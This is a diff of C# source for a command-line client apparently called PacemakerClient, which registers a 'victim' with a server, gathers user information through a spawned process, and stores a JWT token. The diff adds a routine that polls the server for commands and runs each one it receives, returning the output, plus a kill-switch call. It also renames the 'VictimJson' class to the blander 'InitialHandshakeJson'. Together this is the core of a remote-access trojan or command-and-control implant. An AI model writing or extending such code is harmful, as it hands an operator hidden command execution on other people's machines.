@@ -1,19 +1,19 @@
 ﻿using System;
-using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
-using System.IO;
-using System.Net.Http;
-using System.Diagnostics;
 using Newtonsoft.Json;
 using PacemakerClient;
-using System.Runtime.Serialization.Formatters.Binary;
+using System.Net.Http;
 using System.Threading;
+using System.Diagnostics;
+using System.Threading.Tasks;
+using System.Collections.Generic;
+using System.Runtime.Serialization.Formatters.Binary; 
 
 namespace PacemakerClient_cli
 {
-    public class VictimJson
+    public class InitialHandshakeJson
     {
         public string victimName {  get; set; }
         public string victimAdditionalinfo { get; set;}
@@ -22,7 +22,7 @@ namespace PacemakerClient_cli
     internal class Program
     {
         public static string server_hostname = "http://localhost:3000";
-        public static BinaryFormatter bf;
+        public static BinaryFormatter MainBinaryForammatter;
         public static AuthCore authObj;
         static Stream file_stream;
 
@@ -30,14 +30,14 @@ namespace PacemakerClient_cli
         {
             HttpClient Client = new HttpClient();
 
-            VictimJson victimJson = new VictimJson
+            InitialHandshakeJson initialHandshakejson = new InitialHandshakeJson
             {
-                victimName = GetUserInfo("name"),
-                victimAdditionalinfo = GetUserInfo("description")
+                victimName = GetInitialUserInformation("name"),
+                victimAdditionalinfo = GetInitialUserInformation("description")
             };
 
 
-            string output = JsonConvert.SerializeObject(victimJson);
+            string output = JsonConvert.SerializeObject(initialHandshakejson);
 
             var content = new StringContent(output, Encoding.UTF8, "application/json");
 
@@ -51,25 +51,56 @@ namespace PacemakerClient_cli
 
                 authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);
 
-                bf = new BinaryFormatter();
+                MainBinaryForammatter = new BinaryFormatter();
                 Stream stream1;
                 stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
-                bf.Serialize(stream1, authObj);
+                MainBinaryForammatter.Serialize(stream1, authObj);
                 stream1.Close();
 
             }
-
-            // string fullPath = Environment.CurrentDirectory + "\\log.txt";
-
-            /* using (StreamWriter writer = new StreamWriter(fullPath))
+            else
             {
-                writer.WriteLine(json.ToString());
-                writer.WriteLine(jsonResponse.ToString());
-            }*/
-
+                await KillSwitch();
+            }
         }
 
-        public static string GetUserInfo(string option)
+        public async static Task<CmdResult> GetAndRunCmd()
+        {
+            HttpClient Client = new HttpClient();
+
+            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";
+
+            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
+
+            var response = await Client.PostAsync(server_hostname + "/core/getcmd", content);
+
+            Cmd cmdObj;
+            CmdResult resultObj = new CmdResult();
+
+            if (response.IsSuccessStatusCode)
+            {
+                string jsonString = await response.Content.ReadAsStringAsync();
+                cmdObj = JsonConvert.DeserializeObject<Cmd>(jsonString);
+
+
+                if (cmdObj.active && cmdObj.command.Length > 0)
+                {
+                    string result = cmdObj.RunCmd();
+                    resultObj.result = result;
+                    resultObj.username = authObj.Username;
+                    resultObj.jwt_key = authObj.JwtToken;
+                    resultObj.commandId = cmdObj.commandId;
+                }
+            }else if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
+            {
+                await authObj.refresh();
+                await GetAndRunCmd();
+            }
+
+            return resultObj;
+        }
+
+        public static string GetInitialUserInformation(string option)
         {
 
             Process process = new Process();
@@ -120,7 +151,7 @@ namespace PacemakerClient_cli
         {
             HttpClient Client = new HttpClient();
 
-            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt-key\": \"" + authObj.JwtToken + "\"}";
+            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";
 
             var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
 
@@ -146,10 +177,10 @@ namespace PacemakerClient_cli
             {
                 try
                 {
-                    BinaryFormatter bf5 = new BinaryFormatter();                                            ///deserealzing all the survey answer objects into the main 
-                    Stream stream2;                                                                         /// Survey answer list...
+                    BinaryFormatter MainBinaryForammatter5 = new BinaryFormatter();                           ///
+                    Stream stream2;                                                        /// 
                     stream2 = File.Open("authObject.dat", FileMode.Open);
-                    authObj = (AuthCore)bf5.Deserialize(stream2);                         /// the label will update accordingly....
+                    authObj = (AuthCore)MainBinaryForammatter5.Deserialize(stream2);                         /// 
                     stream2.Close();
 
                 }catch (Exception ex)
